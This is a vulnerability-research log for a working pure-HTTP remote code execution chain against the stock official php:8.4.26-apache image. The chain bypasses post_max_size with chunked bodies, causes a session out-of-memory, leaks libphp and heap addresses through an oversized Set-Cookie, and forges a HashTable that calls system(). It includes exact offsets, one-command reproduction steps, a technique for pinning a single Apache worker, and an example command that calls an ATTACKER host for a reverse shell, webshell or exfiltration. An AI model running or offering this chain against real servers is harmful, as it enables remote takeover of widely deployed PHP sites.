# Official 128M / display_errors=Off pure-HTTP progress (2026-10-22, pure/)

Target: the **pure-HTTP** chain on the official `php:8.4.26-apache` (trixie,
`php.ini-production`, official prefork `MaxRequestWorkers=150`,
`display_errors=Off`, `memory_limit=128M`, `output_buffering=4096`, files
session handler): no gdb attached, no reading the target's `/proc`, no
configuration changes.

This document records only this round's standalone experiments under `pure/`,
to avoid conflicts with other work in `de0/` and `tools/`.

## 0. Summary of conclusions

1. **New primitive: `Transfer-Encoding: chunked` bypasses `post_max_size`.**
   Without `Content-Length`, `SG(request_info).content_length = 0`, and
   the `post_max_size` check in `rfc1867_post_handler` is skipped; the multipart
   parser reads the dechunked request body directly. In testing, 10MB / 63MB
   bodies parse normally; the same body with `Content-Length: 10MB` does not
   reach session initialization.
2. **Pure-HTTP A1 (send_cookie OOM) has been reproduced** (`pure/mk_a1.py` +
   `pure/chunked_send.py`): official configuration, no gdb, response 500; gdb
   observation confirms that at the `php_url_encode` entry
   `fs128len=0 / free_pages=0 / rsize=limit`, with `PS(send_cookie)=1`,
   `PS(id)` dangling, and `PS(mod_data)` non-NULL.
3. **The query string can move A's `PS(id)` / `PS(mod_data)` / basedir to
   different bin-40 slots on page 0x56**: each query parameter with an
   8-character name moves the md slot +2 (two key copies), and the id/basedir
   pages shift accordingly.
4. **The pure-HTTP out-of-bounds read is working end to end** (no gdb, 3/3):
   - A: `mk_a1.py --big 78` (default parts/fillers/burners/progress=4000),
     URL `/index.php?q0000000=v&...&q0000004=v` (5 parameters with
     8-character names), chunked send → 500.
   - B: `mk_leak_b.py --spec "A:0x137"×24 --fake-len 0x2000 --tag`,
     chunked send → **200 OK**, `Set-Cookie` decodes to 8192 bytes:
     `/02BBBBB` + 8184 bytes of heap contents left over from request A, containing
     62 in-chunk pointers.
   - The read length can be increased to 0x80000 (512KB) and 0xC8000 (800KB);
     responses of 1.5–2.3MB still return normally; pointers cluster on 2MiB
     alignment, **directly yielding the chunk base**.
5. **The libphp leak has been obtained** (no longer requiring the window to
   "happen to" contain a HashTable residual):
   In B, place 14 full-block forge values `G:511:0x137`, 1 `G:400:0x137`
   (ending at page 0x137 of the chunk containing id), then 1 more
   `G:511:0x137`, and finally 900 nested array fields `X:900`. The G:400
   value leaves a hole of 111 pages (pages 0x191..0x1ff) in the id
   chunk; the real `HashTable`/Bucket chain of the `X` fields is placed by
   Best-Fit into these holes, with
   `pDestructor = zval_ptr_dtor`. In the 800KB window this pointer appears
   **1095 times**, so `libphp = value - 0x65EB60`. The window also contains a
   2MiB-aligned pointer cluster with a count of 87, which after clustering is
   exactly the **main chunk base**.
6. **The full pure-HTTP RCE chain is working**: root `exploit.py`
   (`pure/pwn_pure.py` retained as an alias) completes the entire chain in one
   command: A1 (OOM) → B1 (out-of-bounds read, computing libphp + main chunk at
   the same time) → A2 (cheap-OOM) → B2 (fake-ref + forged HashTable,
   `pDestructor=zif_system`) → executes `id` on the target. Single-worker
   baseline **20/20**; official workers (`MaxRequestWorkers=150`, first
   occupying 149 children) **10/10**, about 3–4 seconds per run, the pinned
   worker does not restart, and the target is still the official
   `php.ini-production` (`display_errors=Off`, 128M).

## 1. chunked bypass of post_max_size (evidence)

```
# 10MB multipart body, chunked:
python3 pure/chunked_send.py --port 18110 --body-file /tmp/body10m.bin
  -> body=10486026 resp=259 HTTP/1.1 200 OK
  gdb: SESSINIT hit (END cleanup executed), url_encode 132B allocation succeeded
# Same body with Content-Length: 10486026:
  -> no SESSINIT, no session initialization (handler returns at the start)
```

Key point: `rfc1867_post_handler` compares `content_length` only at entry; for a
chunked request `content_length=0`. `multipart_buffer_fill` calls
`sapi_module.read_post` directly, with no `post_max_size` accounting. Apache
defaults `LimitRequestBody=0`. Thus we can send an arbitrarily large multipart
body (>8MB) for heap shaping.

## 2. Pure-HTTP A1 (send_cookie OOM)

The default shape of `pure/mk_a1.py` (= the OOM shape previously calibrated
with gdb):

```
PHPSESSID=\0
860 depth-64 nested empty file fields (index0: filename="A", CT=103B;
                              index1: filename="A", CT=231B; the rest filename="")
14 103B-name / 8B-value fillers (placed after the nested fields)
78 8000B large values (placed after the fillers)
20 4000B burners
PHP_SESSION_UPLOAD_PROGRESS = 'k'*4000   ← last page consumer
```

Measured (official configuration, no gdb): HTTP 500; at the URL breakpoint
`fs128len=0 rsize=0x8000000 limit=0x8000000 fp=0`;
`PS(send_cookie)=1`, `PS(id)=chunk+0x137000`,
`PS(mod_data)=chunk+0x560a0/page 0x56 slot4`, basedir=a real string pointer.
OOM stack: `zend_mm_safe_error ← zend_mm_alloc_pages ← zend_mm_alloc_small_slow
← php_url_encode ← php_session_reset_id ← php_session_initialize
← php_session_rfc1867_callback`.

Note: the `progress` value is also the allocation source for the smart_str key;
the 4000 bytes are used to consume the last page before url_encode; do not
shorten it arbitrarily.

## 3. The query string moves A's END allocation slots

A's `PS(mod_data)` (40B ps_files) comes from the ecalloc of the bin-40
free-list head by `s_open` at the end of A; `PS(id)` (create_sid) comes from
the bin-64 head. The query string allocates bin-40/bin-64 strings during the
`_GET` phase (earlier than `_POST`), so it can shift these heads:

| A's query | md slot (page 0x56) | id page | basedir page |
|---|---|---|---|
| none | slot4 | 0x137 | 0x1f3 |
| 1×`qqqqqqqq=v` | slot6 | 0x137 | 0x1f1 |
| 2× | slot8 | 0x137 | 0x1c1 |
| 3× | slot10 | 0x137 | 0x1e9 |
| 5× | slot14 | 0x137 | 0x007 |
| 2×`q…=v*48` (BIG=74) | slot8 | 0x1dc | 0x1c1 |

Pattern: each parameter with an 8-character name (1B value) advances the md slot
by 2; a 40–63B value (bin-64) pushes the id page. `BIG` also affects the fs64
head (BIG 74→78 changes the id page 0x1dc→0x137); all calibration must be
determined in pairs (query shape + BIG/BURN/F128).

## 4. Why "same-address close" cannot be used, and a safe alternative

### 4.1 Same address (s_open's ecalloc hits the stale md)

Changing `heap->free_slot[4]` to md with gdb confirms that `ps_close_files`
closes exactly the newly allocated ps_files (last_key=0, basedir=new string,
fd=-1), and the close itself is safe; but afterwards `PS(mod_data)` points to
a freed block, `s_read` fails and triggers `php_session_abort()` to close
again, causing a bin-40 double free:

```
WMD[1] ecalloc(md)            -> 0
WMD[2] ps_close_files frees   -> free-list next
WMD[3] zend_llist_add_element -> llist element allocated at md
WMD[4] php_session_abort close-> frees the list element (still in SG(headers))
WMD[5] sapi_send_headers reallocates md -> overwrites element->next/prev
...
Program received signal SIGSEGV in _efree <- zend_llist_destroy
                                    <- sapi_deactivate_module <- php_request_shutdown
```

`zend_llist_element` is 39B (bin-40), landing exactly on md; after the double
free the free list self-loops, the default `Content-Type` element in the output
phase reuses md, and `zend_llist_destroy` reads the corrupted `header` pointer
(measured rdi = ASCII `"ext/html"`) → SIGSEGV. Because mod_php calls
ap_pass_brigade only **after** `php_request_shutdown`, the response is lost.

### 4.2 Safe close (the path currently used)

Let `s_open`'s ecalloc take another slot (B's bin-40 head is page0x56 slot1),
so A's md lands in B's free list but not at the head (e.g.
slot6/slot8/slot14):

- `last_key` = pointer to the next free slot (mapped) → release performs only
  one subtraction;
- `basedir` = retained "/tmp" pointer from request A;
- `efree(md)` lands on an SRUN page of bin-40 → safe;
- Key additional condition: **the refcount of basedir must not be 1**,
  otherwise `zend_string_release_ex(basedir)` will efree onto a FRUN page of a
  cached chunk → `zend_mm_panic`.

We use 501/511-page flood values to reactivate the cached chunk containing basedir
and overwrite its page (refcount becomes 0x41414141 ≠ 1), making the release a
no-op.

## 5. The pure-HTTP out-of-bounds read that is working (no gdb, 3/3)

### 5.1 A

```
python3 pure/mk_a1.py --out a.bin --big 78
python3 pure/chunked_send.py --port 18110 --body-file a.bin \
  --path "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
# -> HTTP/1.0 500
```

Effect (gdb recheck, diagnostics only): `md = main+0x56230` (page 0x56 slot14;
`main` is A1's ZendMM main chunk), while the id chunk is at
`main-0x6c9000`, `PS(id) = (id chunk)+0x137000`, `send_cookie=1`; `basedir` is
on page 0x007 (will be overwritten by the flood value).

### 5.2 B

The fields generated by `pure/mk_leak_b.py` use a 311-page LRUN (filled with `A`);
the data ends at page 0x137, where a fake `zend_string` header is written:

```
data_start = chunk + 0x1000 + 0x18
id         = chunk + 0x137000
fake header at data offset 0x135FE8:
  +0x00 refcount = 0          (rshutdown release does not decrement to 0)
  +0x04 type     = 0x16       (IS_STRING|GC_NOT_COLLECTABLE)
  +0x08 h        = 0
  +0x10 len      = 0x2000
  +0x18 data     = "/02BBBBB" (first byte non-0; '/' makes valid_key fail)
L = 0x136008 -> size 0x136021 -> 311 pages (pages 1..311)
```

B also carries `PHPSESSID=a` (1B) and `PHP_SESSION_UPLOAD_PROGRESS=k0`; 24
`A:0x137` fields are enough to pull all 31 cached chunks once, so that both the
id chunk and the basedir chunk get the 311-page value (both the id page and
the basedir page lie within pages 1..311).

```
python3 pure/mk_leak_b.py --out b.bin --spec "A:0x137,A:0x137,...,A:0x137" \
  --fake-len 0x2000 --tag
python3 pure/chunked_send.py --port 18110 --body-file b.bin --save-response b.resp
# -> HTTP/1.1 200 OK
# Set-Cookie: PHPSESSID=/02BBBBB<8184 bytes residual>
#   starts with %2F, length 8200 after URL decoding
```

Results (3/3, different ASLR):

```
run1 decoded=8200 head=b'/02BBBBB\x00df...'  62 in-chunk pointers, cluster=1
run2 decoded=8200 head=b'/02BBBBB\x003c...'  62 in-chunk pointers, cluster=1
run3 decoded=8200 head=b'/02BBBBB\x00ea...'  62 in-chunk pointers, cluster=1
```

The read length can be increased with `--fake-len`:
`0x80000` → decodes 524KB, 7521 pointers (single chunk cluster);
`0xC8000` → decodes 819200 bytes (800KB), a second 2MiB cluster appears
(adjacent/related chunk).
`0xD0000` (crossing the 2MiB boundary) causes SIGSEGV (the next 2MiB is not
necessarily mapped).
All 0x7f… pointers are clustered by `& ~0x1fffff`, and **the largest cluster
is the id chunk base**.

### 5.3 Survival chain (why it can ultimately return 200)

1. `s_open` ecalloc takes slot1 (not stale md=slot6);
2. `ps_close_files(stale)`: last_key=slot7 (free slot, subtraction safe),
   basedir refcount=0x41414141 (flood-overwritten, no-op), efree(md) on an
   SRUN page;
3. `reset_id` uses the forged 8192-len id to generate Set-Cookie (OOB read);
4. `php_session_track_init`;
5. `php_session_valid_key` in `s_read` returns FAILURE because the id data
   contains '/' → `php_session_abort()` closes the new, valid ps_files
   (slot1) → safe;
6. in cleanup, `flush(1)` sees `mod_data=NULL` and skips write/close;
7. `php_rshutdown_session_globals()` releases `PS(id)`: fake header refcount=0
   → decrements to 0xFFFFFFFF, no free;
8. the script `echo "OK\n"` → `php_request_shutdown` completes →
   ap_pass_brigade normally sends 200 + Set-Cookie. The worker does not restart.

## 6. From out-of-bounds read to RCE: the full pure-HTTP chain

### 6.1 B1 leak layout (LEAK_SPEC)

```
LEAK_SPEC = "G:511:0x137" * 14 + "G:400:0x137" + "G:511:0x137" + "X:900"
--fake-len 0xC8000          # 800KB, covering through page 0x1f7 of the id chunk
```

- `G:<pages>:0x137`: a forge value that **occupies a whole block**, writing a
  fake `zend_string` header at the end at page 0x137 (rc=0, type=0x16,
  len=0xC8000, data="/xxBBBBB").
  A 511-page value landing in the id chunk occupies all of pages 1..511 and at
  the same time reactivates the basedir chunk (refcount overwritten to
  0x41…, avoiding `zend_string_release` triggering `zend_mm_panic`).
- `G:400:0x137`: occupies only pages 1..400 (the fake header is still at page
  0x137), leaving the tail pages 0x191..0x1ff of the id chunk free, **111
  pages** in total; Best-Fit then places the HashTable/array allocations of the
  900 `X` fields into these holes, and the 800KB read window covers through
  page 0x1f7, exactly reaching them.
- `X:900`: each field `xNNNNN[a][a]…` (12 levels of nesting) with value `v`.
  What is allocated is a **real HashTable + Bucket chain**, with `pDestructor`
  pointing to libphp's `zval_ptr_dtor`, not a constant we forged.

### 6.2 Window parsing (`exploit.py::parse_leak`)

`exploit.py` defaults to `--arch auto`: it selects x86_64 (`0x7f…`) or
aarch64 (`0xffff…`) automatically from the high bits of the repeated pointer
in the leak window. An explicit `--arch` overrides automatic detection.

After decoding the 800KB, scan qwords for 0x7f… pointers and cluster by
`& ~0x1fffff` (2MiB):

```
decoded=819208
most common heap qword = 0x7fa968bdeb60   # zval_ptr_dtor
  -> libphp = 0x7fa968bdeb60 - 0x65EB60 = 0x7fa968580000
chunk buckets:
  0x7fa966200000  7495   # chunk containing id (window mostly in-chunk pointers)
  0x7fa968a00000  1095   # zval_ptr_dtor cluster = libphp + 0x480000
  0x7fa966800000    87   # main chunk
  0x7fa966000000    79   # adjacent chunk
```

- `libphp`: take the non-chunk pointer that **appears most often** in the
  window and subtract `zval_ptr_dtor=0x65EB60`.
- `main chunk`: after excluding the libphp cluster and the id cluster with the
  largest count, take the cluster whose count is closest to **87**. All 87
  pointers fall within the first 2MiB of the main chunk, so the cluster
  address is the main chunk base.
- Sanity check: `libphp - main` must be in the range **0x1A00000–0x1F00000**
  (measured 0x1B99–0x1D80). If not, the "most frequent pointer" is a repeated
  value from another module/generation, this leak is invalid, and A1+B1 are
  repeated (`--retries`, default 3).

### 6.3 Stage-3 (dependencies are now built into `pure/`, pure HTTP)

```
S    = main + 0xF8398        # position to be forged into a zend_array
zif  = libphp + 0x465370     # zif_system
A2   = pure/cheap_oom_a.py --parts 880 --depth 64 --fillers 115
       -> hsv = main + 0x7D720 (PS(hash_serialize_verifier) points to the heap)
B2   = pure/mk_ht.py S zif "id>/out/p1" ht
       pure/fake_ref_b.py --vl 384 --n1 500 --n2 495 --rc 1 \
            --ht-addr S --ht-file ht
```

`fake_ref_b.py` uses a 384B value with refcount 1 to overwrite `hsv` with a
zval pointing to S; the forged zend_array at S has `pDestructor` =
`zif_system`, and `nApplyCount`/`arData` point to `"id>/out/p1"`. At request
shutdown, `zend_hash_destroy` calls `system(cmd)`, and the command output
lands in `/out/p1`.

### 6.4 Measured results and stability

```
[4/4] RCE OK; proof /home/debian/p2s-pure-1022/out/p1:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- Single-worker baseline **20/20**: on the debug image with debug symbols, the same
  worker 8 times in a row, 7 fresh containers each with `--restart`;
  additionally 5/5 on the **stock official image
  `php:8.4.26-apache`** (no gdb/symbols installed, only copying the official
  `php.ini-production` to `php.ini` inside the container). About 2 seconds each
  time, the pinned worker pid does not change, and the target configuration is
  unmodified.
- Official workers (stock MPM: `StartServers 5`, `MaxRequestWorkers 150`)
  **10/10**: 4 times on 18110 (3 in the same container + 1 with `--restart`),
  6 times on 18112 (1 first run + 3 in the same container + 2 with
  `--restart`); about 3–4 seconds each (including 149 placeholder
  connections).
- There was 1 failure before hardening: in that run the most frequent qword in
  the window was not `zval_ptr_dtor` (the derived libphp differed from main by
  0xCB80000). The delta check above now discards such leaks and retries; a
  retry after a failure does not reuse worker addresses already corrupted by A2;
  instead, it restarts the whole chain (A1+B1).
- The full chain uses only HTTP (chunked multipart + normal GET/POST); the
  delivery path does not attach gdb, does not read the target's `/proc`, and
  does not change the target configuration.

### 6.5 From a single worker to official workers (MaxRequestWorkers=150)

The official image's `mpm_prefork.conf` is `StartServers 5`,
`MaxRequestWorkers 150`; if A1/B1/A2/B2 land on different children, the
cross-request dangling pointers do not exist. The pure-HTTP solution is to
**occupy all other children and leave only one**:

```text
1. Open MaxRequestWorkers-1 = 149 connections, each sending only POST headers and a 1-byte body,
   Content-Length: 1048576; prefork will assign a child to each connection and block at
   read body (Timeout defaults to 60s, the chain only needs 3–4s).
2. The only remaining idle child handles warm GET, A1, B1, A2, B2 in sequence;
   after each request it again becomes the only idle child, so the four steps necessarily land in the same process.
3. After the chain ends, close the 149 connections and the children return to idle.
```

Implementation: `exploit.py --workers 150` (default). `--workers 1` falls back
to the single-worker baseline, `--workers N` is for other
`MaxRequestWorkers` configurations. Note not to over-occupy: more than N-1
connections will queue in the accept queue, and after A1 finishes they will
grab the idle child first, instead pushing B1 to another child. Environments
other than the official default need N specified explicitly.

## 7. Reproduction commands (pure HTTP, no gdb)

```bash
# Target container: stock official php:8.4.26-apache + official php.ini-production
./pure/run_pure.sh                     # default p2s-pure-18110 / 18110
                                       # default official prefork (150 workers)
                                       # --single single worker; --dbg image with debug symbols

# One command: A1 -> B1 leak -> A2 -> B2 -> system(cmd)
# default --workers 150 (occupies 149 children); single-worker baseline uses --workers 1
python3 exploit.py --port 18110
# expect the last two lines:
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Restart the container each time (new ASLR):
python3 exploit.py --port 18110 --restart p2s-pure-18110

# Custom command (reverse connection, write webshell, exfiltrate data, etc.):
python3 exploit.py --port 18110 \
  --cmd 'php -r "file_get_contents(\\"http://ATTACKER/ok\\");"'
```

Reproduce A1 / out-of-bounds read separately:

```bash
# 1) A1: END-cleanup send_cookie OOM (with 5 8-character query parameters)
python3 pure/mk_a1.py --out /tmp/a.bin --big 78
python3 pure/chunked_send.py --port 18110 --body-file /tmp/a.bin \
  --path "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
# expect HTTP/1.0 500

# 2) B: forge values x16 + 900 array fields, 819KB Set-Cookie OOB read
SPEC=$(python3 -c 'print(",".join(["G:511:0x137"]*14+["G:400:0x137","G:511:0x137","X:900"]))')
python3 pure/mk_leak_b.py --out /tmp/b.bin \
  --spec "$SPEC" --fake-len 0xC8000 --tag
python3 pure/chunked_send.py --port 18110 --body-file /tmp/b.bin \
  --timeout 300 --save-response /tmp/b.resp
# expect HTTP/1.1 200 OK; Set-Cookie decodes to 819208 bytes
```

Decode / obtain the chunk base and libphp:

```python
import urllib.parse, struct
from collections import Counter
raw=open("/tmp/b.resp","rb").read()
i=raw.find(b"Set-Cookie: PHPSESSID=")
v=raw[i+len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
dec=urllib.parse.unquote_to_bytes(v.decode("latin1"))
qs=[struct.unpack_from("<Q",dec,o)[0] for o in range(0,len(dec)-8,8)]
c=Counter(q & ~0x1fffff for q in qs if 0x7f0000000000 <= q <= 0x7fffffffffff)
print(hex(c.most_common(1)[0][0]))          # id chunk base
print(hex(Counter(qs).most_common(1)[0][0] - 0x65EB60))  # libphp
```

## 8. Files

| File | Purpose |
|---|---|
| `pure/run_pure.sh` | Start standalone container `p2s-pure-18110`: default stock official `php:8.4.26-apache` + official `php.ini-production` + official prefork (150 workers); `--single` single worker; `--dbg` symbol image |
| `pure/docker/` | Docker assets for the pure chain: `www/index.php` (target page) and the non-official single-worker override `apache-single-worker.conf`; the root `docker/` directory retains only compatibility symlinks pointing here |
| `pure/chunked_send.py` | Send chunked multipart body (bypasses post_max_size) |
| `pure/mk_a1.py` | A1 body (OOM shape; query supplied via `--path`) |
| `pure/mk_leak_b.py` | B body: `A:<page>` 311-page forge, `G:<pages>:<page>` full-block forge, `F/S` flood, `X:n` array fields |
| `exploit.py` | **one-command full chain**: A1 → B1 (libphp+main) → A2 → B2 → `system(cmd)`; includes delta check and retries (`pure/pwn_pure.py` is its alias) |
| `pure/cheap_oom_a.py` / `mk_ht.py` / `fake_ref_b.py` | stage-3 dependencies, now built in from `de0/`, keeping the repository self-contained |
| `pure/decode_cookie.py` | Decode the `Set-Cookie` in the response, print header/clusters/pointer counts |
| `pure/mk_b_min.py` | minimal B + slot-shaping fields (for calibration) |
| `pure/mk_flood.py` | early flood generator (kept) |
| `pure/a1_probe.gdb` / `slots4*.gdb` / `force_b.gdb` / `force_watch_b.gdb` / `check_boundary.gdb` / `read_state.gdb` | diagnostic gdb scripts (not the delivery path) |
| `pure/RESEARCH_PURE_128M.md` | this document |
| remote `~/p2s-pure-1022/evidence/e_r1..3.resp` | raw responses of 3 successful 200 OK out-of-bounds reads |
| remote `~/p2s-pure-1022/evidence/pwn_pure_batch_20261022.log` | post-hardening 6-run streak (3 same worker + 3 fresh containers) full-chain log |
| `pure/evidence/pwn_pure_official_20261022.log` | 3-run full-chain log on stock official `php:8.4.26-apache` + official `php.ini-production` |
| `pure/evidence/exploit_entry_20261022.log` | 1 full chain each for root `exploit.py` and the `pure/pwn_pure.py` alias |
| `pure/evidence/official_workers_20261022.log` | 4-run full-chain log on official workers (MaxRequestWorkers=150) |

## 9. Constraints and disclaimer

- All request shapes are bound to the official `php:8.4.26-apache` (trixie)
  build, official `php.ini-production`, official prefork workers (default
  `MaxRequestWorkers=150`; use `--workers N` for other values); changing the
  build/ini requires recalibration.
- For vulnerability research and reproduction in authorized environments only.
